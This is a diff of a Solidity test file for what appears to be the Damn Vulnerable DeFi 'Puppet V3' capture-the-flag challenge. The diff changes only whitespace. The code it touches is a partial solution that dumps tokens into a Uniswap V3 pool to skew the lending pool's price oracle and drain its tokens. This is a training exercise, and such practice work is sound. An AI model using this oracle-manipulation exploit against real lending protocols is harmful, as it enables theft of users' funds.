@@ -18,7 +18,6 @@ contract PuppetV3Challenge is Test {
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
 
-
     uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
     uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
     uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
@@ -118,19 +117,16 @@ contract PuppetV3Challenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
-
-
     /**
      * CODE YOUR SOLUTION HERE
      */
-
     function test_puppetV3() public checkSolvedByPlayer {
         // 1. Approve tokens for Uniswap
         token.approve(
             address(0xE592427A0AEce92De3Edee1F18E0157C05861564), // Uniswap V3 Router
             type(uint256).max
         );
-        
+
         // 2. Create swap params to sell DVT for WETH
         ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
         ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
@@ -139,8 +135,8 @@ contract PuppetV3Challenge is Test {
             fee: FEE,
             recipient: player,
             deadline: block.timestamp,
-            amountIn: 110e18,  // All our DVT
-            amountOutMinimum: 0,  // We don't care about slippage for the attack
+            amountIn: 110e18, // All our DVT
+            amountOutMinimum: 0, // We don't care about slippage for the attack
             sqrtPriceLimitX96: 0
         });
 
@@ -153,7 +149,7 @@ contract PuppetV3Challenge is Test {
         // 5. Calculate how much we need to borrow and deposit
         uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
         uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(lendingPoolBalance);
-        
+
         console.log("Lending pool balance:", lendingPoolBalance / 1e18);
         console.log("Deposit required:", depositRequired / 1e18);
 
@@ -169,8 +165,7 @@ contract PuppetV3Challenge is Test {
         // 9. Send tokens to recovery address
         token.transfer(recovery, lendingPoolBalance);
     }
- 
-    
+
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
